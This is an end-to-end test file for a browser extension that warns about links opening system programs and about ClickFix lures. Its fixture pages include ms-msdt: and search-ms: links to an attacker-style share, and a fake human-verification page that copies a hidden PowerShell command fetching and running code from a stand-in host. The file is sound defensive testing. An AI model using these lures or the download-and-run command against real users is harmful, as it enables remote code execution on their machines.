import { SURFACE_MOUNT_MS } from './budgets.js'
import { expect, serve, test } from './hooks.js'
import { expectBanner, expectJournalLine } from './surfaces.js'

/**
 * SCN-049: a link that may open a program outside the browser, in a real browser.
 *
 * The unit tests run in happy-dom, which does not retarget a click leaving a shadow
 * root and never sent "This is wrong" through the surface slot; both defects passed
 * every unit test and broke the product (round 1 of the B-165 certification). These
 * walk them where they happen.
 *
 * **No address reaches the system.** Every fixture page carries a window listener in
 * the bubble phase that records whether the extension had already stopped the click,
 * then cancels every non-http(s) link click itself. A failing run stops at the
 * assertion; it never hands `ms-msdt:` or `search-ms:` to the machine running it.
 */

const SAFETY = `<script>
  window.__held = []
  window.addEventListener('click', (event) => {
    const link = event.composedPath().find((n) => n instanceof Element && n.matches('a[href]'))
    const href = link ? link.href : (event.target && event.target.getAttribute && event.target.getAttribute('data-href'))
    if (href && !/^https?:/i.test(href)) {
      window.__held.push(event.defaultPrevented)
      event.preventDefault()
    }
  })
  window.addEventListener('auxclick', (event) => {
    window.__held.push(event.defaultPrevented)
    event.preventDefault()
  })
</script>`

const SHADOWED = `<!doctype html>
<html><body>
  <p>Downloads</p>
  <div id="open-host" style="display:block;width:220px;height:40px"></div>
  <div id="closed-host" data-href="ms-msdt:/id PCWDiagnostic" style="display:block;width:220px;height:40px;margin-top:20px"></div>
  ${SAFETY}
  <script>
    const style = 'display:block;width:220px;height:40px;line-height:40px'
    const open = document.getElementById('open-host').attachShadow({ mode: 'open' })
    open.innerHTML = '<a id="in-open" style="' + style + '" href="search-ms:query=invoice&crumb=location:%5C%5Cfiles.attacker.test%5Cshare">Open the invoice</a>'
    const closed = document.getElementById('closed-host').attachShadow({ mode: 'closed' })
    closed.innerHTML = '<a style="' + style + '" href="ms-msdt:/id PCWDiagnostic /skip force">Fix the problem</a>'
  </script>
</body></html>`

const FILEFIX = `<!doctype html>
<html><body>
  <h1>Verify you are human</h1>
  <p>Press Win + R, then Ctrl + V, then press Enter to complete verification.</p>
  <a id="open" href="search-ms:query=invoice&crumb=location:%5C%5Cfiles.attacker.test%5Cshare">Open File Explorer</a>
  ${SAFETY}
  <script>
    document.getElementById('open').addEventListener('click', () => {
      const area = document.createElement('textarea')
      area.value = 'powershell -w hidden -c "iex(irm http://payload.test/a)"'
      document.body.append(area)
      area.select()
      document.execCommand('copy')
      area.remove()
    })
  </script>
</body></html>`

const headline = (page: import('@playwright/test').Page) => page.locator('okolos-banner [data-role=headline]')

test('SCN-049: a link inside an open shadow root is stopped and named', async ({ context }) => {
  await serve(context, SHADOWED)
  const page = await context.newPage()
  await page.goto('https://fixture.test/shadow')

  await page.locator('#in-open').click()
  await expectBanner(page, context)
  await expect(headline(page)).toContainText('may open a program on your computer')
  await expect(page.locator('okolos-banner [data-role=detail]')).toContainText('search-ms:')
  expect(await page.evaluate(() => (window as unknown as { __held: boolean[] }).__held)).toEqual([true])
})

test('SCN-049: a link inside a closed shadow root is stopped and named', async ({ context }) => {
  await serve(context, SHADOWED)
  const page = await context.newPage()
  await page.goto('https://fixture.test/shadow')

  const box = await page.locator('#closed-host').boundingBox()
  if (box === null) throw new Error('the closed host has no box')
  await page.mouse.click(box.x + 20, box.y + box.height / 2)
  await expectBanner(page, context)
  await expect(page.locator('okolos-banner [data-role=detail]')).toContainText('ms-msdt:')
  expect(await page.evaluate(() => (window as unknown as { __held: boolean[] }).__held)).toEqual([true])
})

test('SCN-049: "This is wrong" closes the warning for good, and that link goes through', async ({
  context,
}) => {
  await serve(context, SHADOWED)
  const page = await context.newPage()
  await page.goto('https://fixture.test/shadow')

  await page.locator('#in-open').click()
  await expectBanner(page, context)
  // Focus moved to the warning's first action, not left on the covered link.
  await expect(page.locator('okolos-banner [data-role=primary]')).toBeFocused()

  await page.locator('okolos-banner [data-role=dispute]').click()
  // Past the slot watch's three re-mounts, a quarter-second apart.
  await page.waitForTimeout(1200)
  await expect(page.locator('okolos-banner')).toHaveCount(0)

  await page.locator('#in-open').click()
  await page.waitForTimeout(300)
  await expect(page.locator('okolos-banner')).toHaveCount(0)
  // Second click: the extension let it through and only the page's safety stopped it.
  expect(await page.evaluate(() => (window as unknown as { __held: boolean[] }).__held)).toEqual([true, false])
})

test('SCN-049: from the keyboard, focus goes to the warning and comes back to the link', async ({ context }) => {
  // Design review, step 1: Enter on the link left focus on it under a full-page panel,
  // fourteen Tabs from the warning's first button.
  await serve(context, SHADOWED)
  const page = await context.newPage()
  await page.goto('https://fixture.test/shadow')

  await page.locator('#in-open').focus()
  await page.keyboard.press('Enter')
  await expectBanner(page, context)
  await expect(page.locator('okolos-banner [data-role=primary]')).toBeFocused()

  await page.keyboard.press('Tab')
  await expect(page.locator('okolos-banner [data-role=dispute]')).toBeFocused()
  await page.keyboard.press('Enter')
  await expect(page.locator('okolos-banner')).toHaveCount(0)
  await expect(page.locator('#in-open')).toBeFocused()
})

test('SCN-049: a right click on the link raises nothing', async ({ context }) => {
  await serve(context, SHADOWED)
  const page = await context.newPage()
  await page.goto('https://fixture.test/shadow')

  await page.locator('#in-open').click({ button: 'right' })
  await page.keyboard.press('Escape')
  await page.waitForTimeout(600)
  await expect(page.locator('okolos-banner')).toHaveCount(0)
})

test('SCN-049 with SCN-008: a fake check that opens search-ms: and copies a command ends on the ClickFix warning', async ({
  context,
  extensionId,
}) => {
  await serve(context, FILEFIX)
  const page = await context.newPage()
  await page.goto('https://fixture.test/verify')

  // The wording alone raises the ClickFix warning first (SCN-008); a person who
  // disputes it and clicks the link is the case that was silenced.
  await expectBanner(page, context)
  await page.locator('okolos-banner [data-role=dispute]').click()
  await page.waitForTimeout(1200)
  await expect(page.locator('okolos-banner')).toHaveCount(0)

  await page.locator('#open').click()
  await expect(headline(page)).toContainText('copied a command', { timeout: SURFACE_MOUNT_MS })
  expect(await page.evaluate(() => (window as unknown as { __held: boolean[] }).__held)).toEqual([true])

  const journal = await context.newPage()
  await journal.goto(`chrome-extension://${extensionId}/options.html#journal`)
  const line = await journal.evaluate(() => chrome.i18n.getMessage('logTrapClickfix'))
  await expectJournalLine(journal, line.slice(0, 40))
})
